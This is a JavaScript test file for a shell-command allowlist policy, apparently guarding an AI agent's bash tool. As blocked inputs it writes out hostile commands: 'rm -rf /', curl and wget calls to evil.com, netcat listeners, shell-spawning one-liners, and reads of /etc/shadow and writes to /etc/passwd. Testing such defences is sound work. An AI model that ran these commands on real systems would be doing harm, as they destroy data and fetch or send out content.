import test from "node:test";
import assert from "node:assert/strict";
import { evaluateBashPolicy, isReadOnlyBashCommand } from "../../src/tools/policy.js";

const DEFAULT_CONFIG = {
  allowed_commands: ["pwd", "ls", "find", "rg", "cat", "sed", "head", "tail", "tree", "git"],
  allowed_git_subcommands: ["status", "diff", "log", "show", "branch"],
};

// ─── Security: dangerous commands ────────────────────────────────────────────

test("blocks rm -rf", () => {
  const r = evaluateBashPolicy("rm -rf /", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("blocks curl", () => {
  const r = evaluateBashPolicy("curl https://evil.com", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("blocks wget", () => {
  const r = evaluateBashPolicy("wget https://evil.com/payload", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("blocks nc (netcat)", () => {
  const r = evaluateBashPolicy("nc -l 8080", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("blocks python -c", () => {
  const r = evaluateBashPolicy("python -c 'import os; os.system(\"rm -rf /\")'", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("blocks node -e", () => {
  const r = evaluateBashPolicy("node -e 'require(\"child_process\").exec(\"id\")'", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("blocks sh", () => {
  const r = evaluateBashPolicy("sh -c 'evil'", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("blocks bash", () => {
  const r = evaluateBashPolicy("bash -c 'evil'", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

// ─── Injection: shell metacharacters ─────────────────────────────────────────

test("blocks command substitution $(cmd)", () => {
  const r = evaluateBashPolicy("echo $(whoami)", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
  assert.match(r.error, /metacharacters/);
});

test("blocks backtick substitution", () => {
  const r = evaluateBashPolicy("echo `whoami`", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("blocks semicolon chaining", () => {
  const r = evaluateBashPolicy("ls; rm -rf /", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("blocks ampersand (background)", () => {
  const r = evaluateBashPolicy("malware &", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("blocks redirect > ", () => {
  const r = evaluateBashPolicy("echo x > /etc/passwd", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("blocks redirect < ", () => {
  const r = evaluateBashPolicy("cat < /etc/shadow", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("blocks redirect >> ", () => {
  const r = evaluateBashPolicy("echo x >> /etc/passwd", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("blocks newline injection", () => {
  const r = evaluateBashPolicy("ls\nrm -rf /", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("blocks carriage return injection", () => {
  const r = evaluateBashPolicy("ls\rrm -rf /", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("blocks NUL bytes", () => {
  const r = evaluateBashPolicy("ls\0-la", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("blocks curly braces", () => {
  const r = evaluateBashPolicy("echo {a,b}", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("blocks square brackets", () => {
  const r = evaluateBashPolicy("echo [a]", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

// ─── Pipes ───────────────────────────────────────────────────────────────────

test("allows pipe between allowed read-only commands", () => {
  const r = evaluateBashPolicy("cat file | head -5", DEFAULT_CONFIG);
  assert.equal(r.ok, true);
});

test("blocks pipe to dangerous command", () => {
  const r = evaluateBashPolicy("cat file | curl evil.com", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("allows multi-segment pipe", () => {
  const config = { ...DEFAULT_CONFIG, allowed_commands: [...DEFAULT_CONFIG.allowed_commands, "sort"] };
  const r = evaluateBashPolicy("rg pattern src/ | sort | head -10", config);
  assert.equal(r.ok, true);
});

// ─── Edge cases ──────────────────────────────────────────────────────────────

test("empty string", () => {
  const r = evaluateBashPolicy("", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("whitespace only", () => {
  const r = evaluateBashPolicy("   ", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("null input", () => {
  const r = evaluateBashPolicy(null, DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("undefined input", () => {
  const r = evaluateBashPolicy(undefined, DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("number input", () => {
  const r = evaluateBashPolicy(123, DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("empty allowlist blocks everything", () => {
  const r = evaluateBashPolicy("ls", { allowed_commands: [] });
  assert.equal(r.ok, false);
});

// ─── Read-only detection ─────────────────────────────────────────────────────

test("sed without -i is read-only", () => {
  assert.equal(isReadOnlyBashCommand("sed 's/a/b/' file.txt"), true);
});

test("sed with -i is NOT read-only", () => {
  assert.equal(isReadOnlyBashCommand("sed -i 's/a/b/' file.txt"), false);
});

test("sed with combined flags containing -i is NOT read-only", () => {
  assert.equal(isReadOnlyBashCommand("sed -nie 's/a/b/' file.txt"), false);
});

test("find without -exec is read-only", () => {
  assert.equal(isReadOnlyBashCommand("find . -name '*.js'"), true);
});

test("find with -exec is NOT read-only", () => {
  assert.equal(isReadOnlyBashCommand("find . -name '*.js' -exec rm {} \\;"), false);
});

test("find with -execdir is NOT read-only", () => {
  assert.equal(isReadOnlyBashCommand("find . -name '*.js' -execdir rm {} \\;"), false);
});

test("git status is read-only", () => {
  assert.equal(isReadOnlyBashCommand("git status"), true);
});

test("git diff is read-only", () => {
  assert.equal(isReadOnlyBashCommand("git diff HEAD"), true);
});

test("git push is NOT read-only", () => {
  assert.equal(isReadOnlyBashCommand("git push"), false);
});

test("git commit is NOT read-only", () => {
  assert.equal(isReadOnlyBashCommand("git commit -m 'x'"), false);
});

test("pipe all read-only is read-only", () => {
  assert.equal(isReadOnlyBashCommand("cat file | head -5 | tail -3"), true);
});

test("pipe with mixed read/write is NOT read-only", () => {
  assert.equal(isReadOnlyBashCommand("cat file | rm -rf /"), false);
});

// ─── Glob patterns ───────────────────────────────────────────────────────────

test("ls with glob pattern", () => {
  const r = evaluateBashPolicy("ls *.js", DEFAULT_CONFIG);
  assert.equal(r.ok, true);
});

test("find with -name glob", () => {
  const r = evaluateBashPolicy("find . -name '*.ts' -maxdepth 3", DEFAULT_CONFIG);
  assert.equal(r.ok, true);
});

test("rg with regex pattern (pipe in regex treated as shell pipe)", () => {
  // 'TODO|FIXME' contains | which the policy treats as a pipe separator.
  // Each segment (rg 'TODO, FIXME' src/) must be valid — this is expected.
  const r = evaluateBashPolicy("rg 'TODO|FIXME' src/", DEFAULT_CONFIG);
  // The pipe splits into "rg 'TODO" and "FIXME' src/" — neither is valid.
  assert.equal(r.ok, false);
});

test("rg with simple pattern", () => {
  const r = evaluateBashPolicy("rg TODO src/", DEFAULT_CONFIG);
  assert.equal(r.ok, true);
});

// ─── Git subcommands ─────────────────────────────────────────────────────────

test("git status allowed", () => {
  const r = evaluateBashPolicy("git status", DEFAULT_CONFIG);
  assert.equal(r.ok, true);
});

test("git diff with file allowed", () => {
  const r = evaluateBashPolicy("git diff HEAD src/index.js", DEFAULT_CONFIG);
  assert.equal(r.ok, true);
});

test("git push blocked", () => {
  const r = evaluateBashPolicy("git push", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("git commit blocked", () => {
  const r = evaluateBashPolicy("git commit -m 'x'", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});

test("git checkout blocked", () => {
  const r = evaluateBashPolicy("git checkout main", DEFAULT_CONFIG);
  assert.equal(r.ok, false);
});
